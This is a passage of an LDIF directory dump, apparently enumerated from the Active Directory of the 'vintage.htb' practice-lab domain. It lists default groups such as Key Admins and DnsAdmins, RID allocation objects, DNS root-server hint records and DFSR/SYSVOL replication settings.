groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Key Admins, Users, vintage.htb
dn: CN=Key Admins,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Key Admins
description: Members of this group can perform administrative actions on key o
 bjects within the domain.
distinguishedName: CN=Key Admins,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20240605104245.0Z
uSNCreated: 12450
uSNChanged: 12786
name: Key Admins
objectGUID:: 90dJOii+OEegN2x1Xgti2w==
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6DgIAAA==
adminCount: 1
sAMAccountName: Key Admins
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605104245.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000416.0Z

# Enterprise Key Admins, Users, vintage.htb
dn: CN=Enterprise Key Admins,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Enterprise Key Admins
description: Members of this group can perform administrative actions on key o
 bjects within the forest.
distinguishedName: CN=Enterprise Key Admins,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20240605104245.0Z
uSNCreated: 12453
uSNChanged: 12785
name: Enterprise Key Admins
objectGUID:: 9j/MP+bdmU6pocOjaB7Nmw==
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6DwIAAA==
adminCount: 1
sAMAccountName: Enterprise Key Admins
sAMAccountType: 268435456
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605104245.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000416.0Z

# RID Manager$, System, vintage.htb
dn: CN=RID Manager$,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: rIDManager
cn: RID Manager$
distinguishedName: CN=RID Manager$,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102745.0Z
whenChanged: 20241228160734.0Z
uSNCreated: 12470
uSNChanged: 114726
showInAdvancedViewOnly: TRUE
name: RID Manager$
objectGUID:: RgtTgLBXx02Jov3JHmc07Q==
fSMORoleOwner: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,
 CN=Sites,CN=Configuration,DC=vintage,DC=htb
rIDAvailablePool: 4611686014132426210
systemFlags: -1946157056
objectCategory: CN=RID-Manager,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 16010101000000.0Z

# RID Set, DC01, Domain Controllers, vintage.htb
dn: CN=RID Set,CN=DC01,OU=Domain Controllers,DC=vintage,DC=htb
objectClass: top
objectClass: rIDSet
cn: RID Set
distinguishedName: CN=RID Set,CN=DC01,OU=Domain Controllers,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102745.0Z
whenChanged: 20241228160734.0Z
uSNCreated: 12473
uSNChanged: 114727
showInAdvancedViewOnly: TRUE
name: RID Set
objectGUID:: 8NRYTQw+yE61Ccat12cZbQ==
rIDAllocationPool: 24056111829998
rIDPreviousAllocationPool: 24056111829998
rIDUsedPool: 0
rIDNextRID: 5102
objectCategory: CN=RID-Set,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240607223855.0Z
dSCorePropagationData: 16010101000001.0Z

# DnsAdmins, Users, vintage.htb
dn: CN=DnsAdmins,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: DnsAdmins
description: DNS Administrators Group
distinguishedName: CN=DnsAdmins,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102815.0Z
whenChanged: 20240605102815.0Z
uSNCreated: 12486
uSNChanged: 12488
name: DnsAdmins
objectGUID:: oc4uOfJbiUux9DNOQjtWYQ==
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6TwQAAA==
sAMAccountName: DnsAdmins
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 16010101000000.0Z

# DnsUpdateProxy, Users, vintage.htb
dn: CN=DnsUpdateProxy,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: DnsUpdateProxy
description: DNS clients who are permitted to perform dynamic updates on behal
 f of some other clients (such as DHCP servers).
distinguishedName: CN=DnsUpdateProxy,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102815.0Z
whenChanged: 20240605102815.0Z
uSNCreated: 12491
uSNChanged: 12491
name: DnsUpdateProxy
objectGUID:: glAdAvuRKkOWFXVyEO9VMA==
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6UAQAAA==
sAMAccountName: DnsUpdateProxy
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 16010101000000.0Z

# MicrosoftDNS, System, vintage.htb
dn: CN=MicrosoftDNS,CN=System,DC=vintage,DC=htb

# RootDNSServers, MicrosoftDNS, System, vintage.htb
dn: DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: dnsZone
cn: Zone
distinguishedName: DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=vintage,DC=h
 tb
instanceType: 4
whenCreated: 20240605102815.0Z
whenChanged: 20240605102815.0Z
uSNCreated: 12501
uSNChanged: 12503
showInAdvancedViewOnly: TRUE
name: RootDNSServers
objectGUID:: eKT6UdexrkG0MY8929bWCg==
objectCategory: CN=Dns-Zone,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 16010101000000.0Z
dc: RootDNSServers

# @, RootDNSServers, MicrosoftDNS, System, vintage.htb
dn: DC=@,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: dnsNode
distinguishedName: DC=@,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=vintage
 ,DC=htb
instanceType: 4
whenCreated: 20240605102815.0Z
whenChanged: 20240605102815.0Z
uSNCreated: 12504
uSNChanged: 12504
showInAdvancedViewOnly: TRUE
name: @
objectGUID:: OJavovEDRkCFg+bSlHkffg==
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBaQxyb290LXNlcnZlcnMDbmV0AA==
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBZwxyb290LXNlcnZlcnMDbmV0AA==
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBYwxyb290LXNlcnZlcnMDbmV0AA==
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBawxyb290LXNlcnZlcnMDbmV0AA==
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBbQxyb290LXNlcnZlcnMDbmV0AA==
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBYgxyb290LXNlcnZlcnMDbmV0AA==
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBZQxyb290LXNlcnZlcnMDbmV0AA==
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBagxyb290LXNlcnZlcnMDbmV0AA==
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBZgxyb290LXNlcnZlcnMDbmV0AA==
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBbAxyb290LXNlcnZlcnMDbmV0AA==
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBaAxyb290LXNlcnZlcnMDbmV0AA==
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBZAxyb290LXNlcnZlcnMDbmV0AA==
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBYQxyb290LXNlcnZlcnMDbmV0AA==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 16010101000000.0Z
dc: @

# a.root-servers.net, RootDNSServers, MicrosoftDNS, System, vintage.htb
dn: DC=a.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=vinta
 ge,DC=htb
objectClass: top
objectClass: dnsNode
distinguishedName: DC=a.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=
 System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102815.0Z
whenChanged: 20240605102815.0Z
uSNCreated: 12505
uSNChanged: 12506
showInAdvancedViewOnly: TRUE
name: a.root-servers.net
objectGUID:: wXdNPmvi+E+OEmXMZy+F/Q==
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEFA7o+AAAAAAAAAAIAMA==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 16010101000000.0Z
dNSTombstoned: FALSE
dc: a.root-servers.net

# d.root-servers.net, RootDNSServers, MicrosoftDNS, System, vintage.htb
dn: DC=d.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=vinta
 ge,DC=htb
objectClass: top
objectClass: dnsNode
distinguishedName: DC=d.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=
 System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102815.0Z
whenChanged: 20240605102815.0Z
uSNCreated: 12507
uSNChanged: 12508
showInAdvancedViewOnly: TRUE
name: d.root-servers.net
objectGUID:: ngOK9+Zpj0u4T5tT8IQ3TA==
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEFAAAtAAAAAAAAAAAADQ==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 16010101000000.0Z
dNSTombstoned: FALSE
dc: d.root-servers.net

# h.root-servers.net, RootDNSServers, MicrosoftDNS, System, vintage.htb
dn: DC=h.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=vinta
 ge,DC=htb
objectClass: top
objectClass: dnsNode
distinguishedName: DC=h.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=
 System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102815.0Z
whenChanged: 20240605102815.0Z
uSNCreated: 12509
uSNChanged: 12510
showInAdvancedViewOnly: TRUE
name: h.root-servers.net
objectGUID:: GIPe7WoH+0iugcTz6Odx8Q==
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEFAAABAAAAAAAAAAAAUw==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 16010101000000.0Z
dNSTombstoned: FALSE
dc: h.root-servers.net

# l.root-servers.net, RootDNSServers, MicrosoftDNS, System, vintage.htb
dn: DC=l.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=vinta
 ge,DC=htb
objectClass: top
objectClass: dnsNode
distinguishedName: DC=l.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=
 System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102815.0Z
whenChanged: 20240605102815.0Z
uSNCreated: 12511
uSNChanged: 12512
showInAdvancedViewOnly: TRUE
name: l.root-servers.net
objectGUID:: A/W9lY2IpE6x/MJzD8DW8w==
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEFAACfAAAAAAAAAAAAQg==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 16010101000000.0Z
dNSTombstoned: FALSE
dc: l.root-servers.net

# f.root-servers.net, RootDNSServers, MicrosoftDNS, System, vintage.htb
dn: DC=f.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=vinta
 ge,DC=htb
objectClass: top
objectClass: dnsNode
distinguishedName: DC=f.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=
 System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102815.0Z
whenChanged: 20240605102815.0Z
uSNCreated: 12513
uSNChanged: 12514
showInAdvancedViewOnly: TRUE
name: f.root-servers.net
objectGUID:: fR61CSf9hkqDIlJ5XlYSow==
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEFAAAvAAAAAAAAAAAADw==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 16010101000000.0Z
dNSTombstoned: FALSE
dc: f.root-servers.net

# j.root-servers.net, RootDNSServers, MicrosoftDNS, System, vintage.htb
dn: DC=j.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=vinta
 ge,DC=htb
objectClass: top
objectClass: dnsNode
distinguishedName: DC=j.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=
 System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102815.0Z
whenChanged: 20240605102815.0Z
uSNCreated: 12515
uSNChanged: 12516
showInAdvancedViewOnly: TRUE
name: j.root-servers.net
objectGUID:: PWCO3yoGjUG2wmvWtLVsGQ==
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEFAwwnAAAAAAAAAAIAMA==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 16010101000000.0Z
dNSTombstoned: FALSE
dc: j.root-servers.net

# e.root-servers.net, RootDNSServers, MicrosoftDNS, System, vintage.htb
dn: DC=e.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=vinta
 ge,DC=htb
objectClass: top
objectClass: dnsNode
distinguishedName: DC=e.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=
 System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102815.0Z
whenChanged: 20240605102815.0Z
uSNCreated: 12517
uSNChanged: 12518
showInAdvancedViewOnly: TRUE
name: e.root-servers.net
objectGUID:: zB8Ob3uw+EmrzdfgrHKtJg==
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEFAACoAAAAAAAAAAAADg==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 16010101000000.0Z
dNSTombstoned: FALSE
dc: e.root-servers.net

# b.root-servers.net, RootDNSServers, MicrosoftDNS, System, vintage.htb
dn: DC=b.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=vinta
 ge,DC=htb
objectClass: top
objectClass: dnsNode
distinguishedName: DC=b.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=
 System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102815.0Z
whenChanged: 20240605102815.0Z
uSNCreated: 12519
uSNChanged: 12520
showInAdvancedViewOnly: TRUE
name: b.root-servers.net
objectGUID:: ZhOXB7XK30yQRZmhyX0nsw==
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAKAEBuAAQAAAAAAAAAAAACw==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 16010101000000.0Z
dNSTombstoned: FALSE
dc: b.root-servers.net

# m.root-servers.net, RootDNSServers, MicrosoftDNS, System, vintage.htb
dn: DC=m.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=vinta
 ge,DC=htb
objectClass: top
objectClass: dnsNode
distinguishedName: DC=m.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=
 System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102815.0Z
whenChanged: 20240605102815.0Z
uSNCreated: 12521
uSNChanged: 12522
showInAdvancedViewOnly: TRUE
name: m.root-servers.net
objectGUID:: h5k7PAATuk2lWaT5vlfcEw==
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAENwwAAAAAAAAAAAAAANQ==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 16010101000000.0Z
dNSTombstoned: FALSE
dc: m.root-servers.net

# k.root-servers.net, RootDNSServers, MicrosoftDNS, System, vintage.htb
dn: DC=k.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=vinta
 ge,DC=htb
objectClass: top
objectClass: dnsNode
distinguishedName: DC=k.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=
 System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102815.0Z
whenChanged: 20240605102815.0Z
uSNCreated: 12523
uSNChanged: 12524
showInAdvancedViewOnly: TRUE
name: k.root-servers.net
objectGUID:: Eztq8Bg1U0KiM0Et6MH2Og==
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEH/QAAAAAAAAAAAAAAAQ==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 16010101000000.0Z
dNSTombstoned: FALSE
dc: k.root-servers.net

# c.root-servers.net, RootDNSServers, MicrosoftDNS, System, vintage.htb
dn: DC=c.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=vinta
 ge,DC=htb
objectClass: top
objectClass: dnsNode
distinguishedName: DC=c.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=
 System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102815.0Z
whenChanged: 20240605102815.0Z
uSNCreated: 12525
uSNChanged: 12526
showInAdvancedViewOnly: TRUE
name: c.root-servers.net
objectGUID:: 1zJz8eUaxk2WyD5tfliLpg==
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEFAAACAAAAAAAAAAAADA==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 16010101000000.0Z
dNSTombstoned: FALSE
dc: c.root-servers.net

# g.root-servers.net, RootDNSServers, MicrosoftDNS, System, vintage.htb
dn: DC=g.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=vinta
 ge,DC=htb
objectClass: top
objectClass: dnsNode
distinguishedName: DC=g.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=
 System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102815.0Z
whenChanged: 20240605102815.0Z
uSNCreated: 12527
uSNChanged: 12528
showInAdvancedViewOnly: TRUE
name: g.root-servers.net
objectGUID:: hNW2oJ0JPEqlKIhiSfDszA==
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEFAAASAAAAAAAAAAANDQ==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 16010101000000.0Z
dNSTombstoned: FALSE
dc: g.root-servers.net

# i.root-servers.net, RootDNSServers, MicrosoftDNS, System, vintage.htb
dn: DC=i.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=vinta
 ge,DC=htb
objectClass: top
objectClass: dnsNode
distinguishedName: DC=i.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=
 System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102815.0Z
whenChanged: 20240605102815.0Z
uSNCreated: 12529
uSNChanged: 12530
showInAdvancedViewOnly: TRUE
name: i.root-servers.net
objectGUID:: gcstyHHzU0SCOl5BJntyMg==
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEH/gAAAAAAAAAAAAAAUw==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 20240605102815.0Z
dSCorePropagationData: 16010101000000.0Z
dNSTombstoned: FALSE
dc: i.root-servers.net

# DFSR-GlobalSettings, System, vintage.htb
dn: CN=DFSR-GlobalSettings,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: msDFSR-GlobalSettings
cn: DFSR-GlobalSettings
distinguishedName: CN=DFSR-GlobalSettings,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605103312.0Z
whenChanged: 20240605103312.0Z
uSNCreated: 12575
uSNChanged: 12576
showInAdvancedViewOnly: TRUE
name: DFSR-GlobalSettings
objectGUID:: MljIwraZwUWzwvtgSFiMEw==
objectCategory: CN=ms-DFSR-GlobalSettings,CN=Schema,CN=Configuration,DC=vintag
 e,DC=htb
dSCorePropagationData: 16010101000000.0Z
msDFSR-Flags: 48

# Domain System Volume, DFSR-GlobalSettings, System, vintage.htb
dn: CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: msDFSR-ReplicationGroup
cn: Domain System Volume
distinguishedName: CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC
 =vintage,DC=htb
instanceType: 4
whenCreated: 20240605103312.0Z
whenChanged: 20240605103312.0Z
uSNCreated: 12577
uSNChanged: 12577
showInAdvancedViewOnly: TRUE
name: Domain System Volume
objectGUID:: 3JjScrDZFEycPRnvNj4WcQ==
objectCategory: CN=ms-DFSR-ReplicationGroup,CN=Schema,CN=Configuration,DC=vint
 age,DC=htb
dSCorePropagationData: 16010101000000.0Z
msDFSR-ReplicationGroupType: 1

# Content, Domain System Volume, DFSR-GlobalSettings, System, vintage.htb
dn: CN=Content,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=vin
 tage,DC=htb
objectClass: top
objectClass: msDFSR-Content
cn: Content
distinguishedName: CN=Content,CN=Domain System Volume,CN=DFSR-GlobalSettings,C
 N=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605103312.0Z
whenChanged: 20240605103312.0Z
uSNCreated: 12578
uSNChanged: 12578
showInAdvancedViewOnly: TRUE
name: Content
objectGUID:: bodpsMyv8kCSatUCKCJdRA==
objectCategory: CN=ms-DFSR-Content,CN=Schema,CN=Configuration,DC=vintage,DC=ht
 b
dSCorePropagationData: 16010101000000.0Z

# SYSVOL Share, Content, Domain System Volume, DFSR-GlobalSettings, System, vin
 tage.htb
dn: CN=SYSVOL Share,CN=Content,CN=Domain System Volume,CN=DFSR-GlobalSettings,
 CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: msDFSR-ContentSet
cn: SYSVOL Share
distinguishedName: CN=SYSVOL Share,CN=Content,CN=Domain System Volume,CN=DFSR-
 GlobalSettings,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605103312.0Z
whenChanged: 20240605103312.0Z
uSNCreated: 12579
uSNChanged: 12579
showInAdvancedViewOnly: TRUE
name: SYSVOL Share
objectGUID:: /3la4suYB0eDua6B7j55OQ==
objectCategory: CN=ms-DFSR-ContentSet,CN=Schema,CN=Configuration,DC=vintage,DC
 =htb
dSCorePropagationData: 16010101000000.0Z
msDFSR-FileFilter: ~*,*.TMP,*.BAK
msDFSR-DirectoryFilter: DO_NOT_REMOVE_NtFrs_PreInstall_Directory,NtFrs_PreExis
 ting___See_EventLog

# Topology, Domain System Volume, DFSR-GlobalSettings, System, vintage.htb
dn: CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=vi
 ntage,DC=htb
objectClass: top
objectClass: msDFSR-Topology
cn: Topology
distinguishedName: CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,
 CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605103312.0Z
whenChanged: 20240605103312.0Z
uSNCreated: 12580
uSNChanged: 12580
showInAdvancedViewOnly: TRUE
name: Topology
objectGUID:: kFrI+ruvIUSVabK85R0KuA==
objectCategory: CN=ms-DFSR-Topology,CN=Schema,CN=Configuration,DC=vintage,DC=h
 tb
dSCorePropagationData: 16010101000000.0Z

# DC01, Topology, Domain System Volume, DFSR-GlobalSettings, System, vintage.ht
 b
dn: CN=DC01,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=Syst
 em,DC=vintage,DC=htb
objectClass: top
objectClass: msDFSR-Member
cn: DC01
distinguishedName: CN=DC01,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalS
 ettings,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605103312.0Z
whenChanged: 20240605103312.0Z
uSNCreated: 12583
uSNChanged: 12583
showInAdvancedViewOnly: TRUE
name: DC01
objectGUID:: wSR4bNTkm0m/4GubpWbPzg==
serverReference: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Nam
 e,CN=Sites,CN=Configuration,DC=vintage,DC=htb
objectCategory: CN=ms-DFSR-Member,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 16010101000000.0Z
msDFSR-ComputerReference: CN=DC01,OU=Domain Controllers,DC=vintage,DC=htb
msDFSR-MemberReferenceBL: CN=Domain System Volume,CN=DFSR-LocalSettings,CN=DC0
 1,OU=Domain Controllers,DC=vintage,DC=htb

# DFSR-LocalSettings, DC01, Domain Controllers, vintage.htb
dn: CN=DFSR-LocalSettings,CN=DC01,OU=Domain Controllers,DC=vintage,DC=htb
objectClass: top
objectClass: msDFSR-LocalSettings
cn: DFSR-LocalSettings
distinguishedName: CN=DFSR-LocalSettings,CN=DC01,OU=Domain Controllers,DC=vint
 age,DC=htb
instanceType: 4
whenCreated: 20240605103312.0Z
whenChanged: 20240605103813.0Z
uSNCreated: 12584
uSNChanged: 12769
showInAdvancedViewOnly: TRUE
name: DFSR-LocalSettings
objectGUID:: BUE/2rbO30at+VhaT7OAHQ==
objectCategory: CN=ms-DFSR-LocalSettings,CN=Schema,CN=Configuration,DC=vintage
 ,DC=htb
dSCorePropagationData: 20240607223855.0Z
dSCorePropagationData: 20240605103312.0Z
dSCorePropagationData: 16010101000001.0Z
msDFSR-Version: 1.0.0.0
msDFSR-Flags: 48

# Domain System Volume, DFSR-LocalSettings, DC01, Domain Controllers, vintage.h
 tb
dn: CN=Domain System Volume,CN=DFSR-LocalSettings,CN=DC01,OU=Domain Controller
 s,DC=vintage,DC=htb
objectClass: top
objectClass: msDFSR-Subscriber
cn: Domain System Volume
distinguishedName: CN=Domain System Volume,CN=DFSR-LocalSettings,CN=DC01,OU=Do
 main Controllers,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605103312.0Z
whenChanged: 20240605103312.0Z
uSNCreated: 12587
uSNChanged: 12587
showInAdvancedViewOnly: TRUE
name: Domain System Volume
objectGUID:: Idm1Jo1IrUOyZNtfXoG2MA==
objectCategory: CN=ms-DFSR-Subscriber,CN=Schema,CN=Configuration,DC=vintage,DC
 =htb
dSCorePropagationData: 20240607223855.0Z
dSCorePropagationData: 16010101000001.0Z
msDFSR-ReplicationGroupGuid:: 3JjScrDZFEycPRnvNj4WcQ==
msDFSR-MemberReference: CN=DC01,CN=Topology,CN=Domain System Volume,CN=DFSR-Gl
 obalSettings,CN=System,DC=vintage,DC=htb

# SYSVOL Subscription, Domain System Volume, DFSR-LocalSettings, DC01, Domain C
 ontrollers, vintage.htb
dn: CN=SYSVOL Subscription,CN=Domain System Volume,CN=DFSR-LocalSettings,CN=DC
 01,OU=Domain Controllers,DC=vintage,DC=htb
objectClass: top
objectClass: msDFSR-Subscription
cn: SYSVOL Subscription
distinguishedName: CN=SYSVOL Subscription,CN=Domain System Volume,CN=DFSR-Loca
 lSettings,CN=DC01,OU=Domain Controllers,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605103312.0Z
whenChanged: 20240605103813.0Z
uSNCreated: 12588
uSNChanged: 12770
showInAdvancedViewOnly: TRUE
name: SYSVOL Subscription
objectGUID:: UZYk2hZtkUyAtOgyy/UB4w==
objectCategory: CN=ms-DFSR-Subscription,CN=Schema,CN=Configuration,DC=vintage,
 DC=htb
dSCorePropagationData: 20240607223855.0Z
dSCorePropagationData: 16010101000001.0Z
msDFSR-RootPath: C:\Windows\SYSVOL\domain
